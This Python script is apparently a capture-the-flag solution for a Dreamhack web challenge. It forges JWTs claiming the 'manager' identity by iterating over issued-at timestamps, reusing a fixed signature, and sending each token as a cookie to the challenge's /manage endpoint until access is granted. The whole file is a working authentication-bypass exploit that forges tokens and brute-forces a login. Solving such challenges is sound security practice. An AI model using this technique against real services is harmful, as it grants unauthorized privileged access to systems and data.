import requests
import json
import base64

def base64_json(json_data):
    stringified = json.dumps(json_data)
    base64_encoded = base64.b64encode(stringified.encode()).decode()
    padding_removed = base64_encoded.rstrip("=")
    return padding_removed

def main():
    for i in range(1687931000, 1687935343):

        payload = {
            "id": "manager",
            "iat": i,
            "exp": i+3600,
            "iss": "cotak"
        }

        tmp_jwttoken = f"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{base64_json(payload)}.eRMrysXk8v_NZxhY0DY4bLdPzZsm-l0ShOHRoBVEHaw"

        response = requests.get('http://host3.dreamhack.games:10512/manage', headers={
            'Content-Type': 'application/json'
        }, cookies={
            'JWT': tmp_jwttoken
        })

        if response.url == "http://host3.dreamhack.games:10512/manage":
            print(tmp_jwttoken)
            print(payload)
            break

        print(i)
        # print(response.url)

if __name__ == '__main__':
    main()